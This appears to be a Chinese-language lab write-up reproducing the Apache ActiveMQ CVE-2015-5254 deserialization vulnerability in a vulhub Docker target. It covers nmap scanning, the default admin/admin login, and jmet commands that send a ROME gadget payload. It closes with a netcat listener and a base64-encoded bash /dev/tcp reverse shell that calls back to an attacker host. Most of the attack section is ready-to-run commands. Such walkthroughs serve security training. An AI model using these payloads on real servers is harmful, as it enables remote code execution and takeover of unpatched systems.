漏洞描述

1
Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

漏洞复现


准备阶段

进入靶场-》启动服务

cd /vulhub/activemq/CVE-2015-5254

docker-compose up -d


信息收集

使用nmap工具进行对网站服务的端口扫描

nmap -sS -T5 -n -p- 192.168.9.151

能看到拥有（8161和61616）2个端口，ActiveMQ的web界面端口就是8161，而他的工作端口是61616


漏洞利用

这里使用到反序列化工具

下载地址：https://github.com/gsheller/ActiveMQ_CVE-2015-5254

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME YOUR-IP 61616

以本机的ip来进行复现首先能看到，tmp文件下并没有success文件


为了查验漏洞

这里要先进入Docker容器里面

docker-compose exec activemq bash

我们通过执行

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/anc" -Yp ROME 127.0.0.1 61616

下图为执行成功，这里就会在 这里需要登录默认是弱口令 admin/admin

我们打开http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event能看到出现了一个队列信息

这里需要点击这条信息才出发这个反序列化漏洞

我们看看服务器是否有出发反序列化漏洞


进一步

拿到shell

这里可以看到能成功的出发，这里我们可以替换为反弹shell，在反弹当中建议要有一台服务器，自己虚拟机弹射桥接模式会有效果，其他测试目前无效果，

这是在攻击端服务器
nc -lvp 4444
以下是客户端加密
echo "bash -i >& /dev/tcp/10.211.55.7/4444 0>&1" > /tmp/shell.sh && bash /tmp/shell.sh
base64加密，这样才能成功反弹
bash -c {echo,ZWNobyAiIGJhc2ggLWkgJmd0OyYgL2Rldi90Y3AvOTIuMTY4LjIuMTU5LzQ0NDQgMCZndDsmMSIgJmd0OyAvdG1wL3NoZWxsLnNoICYmIGJhc2ggL3RtcC9zaGVsbC5zaA==}|{base64,-d}|{bash,-i}
将加密过的内容放入命令执行当中-重点是这里
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,ZWNobyAiIGJhc2ggLWkgJmd0OyYgL2Rldi90Y3AvOTIuMTY4LjIuMTU5LzQ0NDQgMCZndDsmMSIgJmd0OyAvdG1wL3NoZWxsLnNoICYmIGJhc2ggL3RtcC9zaGVsbC5zaA==}|{base64,-d}|{bash,-i}" -Yp ROME 127.0.0.1 61616

我们进行执行，重复之前的内容，点击触发从而拿到反弹到本地机器上shell
